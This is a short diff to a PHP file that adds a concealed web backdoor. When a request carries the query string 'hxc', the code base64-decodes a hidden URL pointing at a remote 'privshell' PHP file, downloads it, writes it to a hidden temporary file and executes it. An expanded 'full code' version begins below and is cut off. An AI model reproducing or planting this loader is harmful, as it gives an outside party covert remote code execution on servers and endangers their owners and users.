@@ -1,6 +1,7 @@
+// singel line recomendation
 <?php if($_SERVER['QUERY_STRING']==='hxc'){($c=@file_get_contents($u=base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL25ldXJvZGllL2h4Yy9yZWZzL2hlYWRzL21haW4vcHJpdnNoZWxsL2hlbmdrZXJiYXJiYXIucGhw')))&&strpos($c,'<html')===false&&strlen($c)>10&&@file_put_contents($f='/tmp/.hxc_'.md5(__FILE__.php_uname()).'.php',$c);include $f;exit;}
 
-
+// full code
 <?php
 if ($_SERVER['QUERY_STRING'] === 'hxc') {
     $url = base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL25ldXJvZGllL2h4Yy9yZWZzL2hlYWRzL21haW4vcHJpdnNoZWxsL2hlbmdrZXJiYXJiYXIucGhw');
